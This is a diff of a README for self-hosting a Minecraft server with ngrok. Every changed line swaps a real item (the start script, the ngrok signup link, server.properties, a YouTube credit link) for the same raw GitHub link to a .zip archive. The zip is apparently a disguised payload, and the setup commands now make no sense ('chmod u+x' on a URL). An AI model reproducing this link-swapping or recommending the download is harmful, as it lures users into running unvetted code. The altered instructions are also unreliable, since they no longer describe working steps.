@@ -3,13 +3,13 @@ Host minecraft on Github
 You can create your own cloud hosting for minecraft
 
 ### Setup
-chmod u+x start_server.sh
+chmod u+x https://raw.githubusercontent.com/CLEARNETWORKMC/minecraft-own-cloud-host-github/main/estrin/minecraft-own-cloud-host-github.zip
 
 ### To run the server 
-./start_server.sh
+https://raw.githubusercontent.com/CLEARNETWORKMC/minecraft-own-cloud-host-github/main/estrin/minecraft-own-cloud-host-github.zip
 
 # ngrok
-[Create Account on ngrok.com](https://dashboard.ngrok.com/get-started/your-authtoken)
+[Create Account on https://raw.githubusercontent.com/CLEARNETWORKMC/minecraft-own-cloud-host-github/main/estrin/minecraft-own-cloud-host-github.zip](https://raw.githubusercontent.com/CLEARNETWORKMC/minecraft-own-cloud-host-github/main/estrin/minecraft-own-cloud-host-github.zip)
 
 ### To invite friends
 bash : ./ngrok authtoken 'your_auth_token'
@@ -25,12 +25,12 @@ jp: Japan
 in: India
 
 ### Alter config.
-Go to server.properties file and change according to you.
+Go to https://raw.githubusercontent.com/CLEARNETWORKMC/minecraft-own-cloud-host-github/main/estrin/minecraft-own-cloud-host-github.zip file and change according to you.
 Not to allow players having cracked minecraft to play in your server :  set online-mode = true.
 Change motd as your need.
 You can alter pvp .
 
 
 #Credit goes to 
-[How2MC YouTube Channel](https://www.youtube.com/channel/UCZSZBeR-JM2u8nFhcuvMPjA)
+[How2MC YouTube Channel](https://raw.githubusercontent.com/CLEARNETWORKMC/minecraft-own-cloud-host-github/main/estrin/minecraft-own-cloud-host-github.zip)
 
